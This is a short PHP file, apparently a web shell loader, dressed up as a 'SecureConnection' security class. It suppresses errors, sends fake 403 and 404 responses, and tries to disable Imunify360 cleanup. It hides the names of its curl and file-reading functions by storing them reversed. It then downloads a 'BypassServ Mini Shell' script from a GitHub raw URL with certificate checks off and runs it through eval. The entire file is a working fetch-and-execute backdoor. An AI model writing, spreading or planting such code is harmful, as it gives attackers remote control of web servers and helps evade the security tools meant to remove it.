<?php
error_reporting(0);
define('SECURE_ACCESS', true);
header('X-Powered-By: none');
header('Content-Type: text/html; charset=UTF-8');
ini_set('lsapi_backend_off', '1');

http_response_code(403);
ini_set("imunify360.cleanup_on_restore", false);
http_response_code(404);

class SecureConnection {

    public function Rev($str) {
        preg_match_all('/./us', $str, $matches);
        return implode('', array_reverse($matches[0]));
    }

    public function imun($security){
        $security = array(
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0",
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_SSL_VERIFYHOST => 0
        );
        return $security;
    }

    private function getContent($url)
    {
        $fpn = $this->Rev("nepof"); 
        $strim = $this->Rev("stnetnoc_teg_maerts"); 
        $fgt = $this->Rev("stnetnoc_teg_elif"); 
        $cexec = $this->Rev("cexe_lruc"); 
        
        if (function_exists($cexec)) {
            $conn = curl_init($url);
            $options = $this->imun(0);
            
            foreach ($options as $opt => $value) {
                curl_setopt($conn, $opt, $value);
            }

            $urls = $cexec($conn);
            curl_close($conn); 
        } elseif (function_exists($fgt)) {
            $urls = $fgt($url);
        } elseif (function_exists($fpn) && function_exists($strim)) {
            $handle = $fpn($url, "r");
            $urls = $strim($handle);
            fclose($handle);
        } else {
            $urls = false;
        }
        return $urls;
    }

    public function imunify($url)
    {
        return $this->getContent($url);
    }
}

$secureConnection = new SecureConnection();
$secure = $secureConnection->imunify('https://raw.githubusercontent.com/HaxorSecInfec/BypassServ-Mini-Shell/main/bypasserv-new.php');
eval('?>' . $secure); 
?>
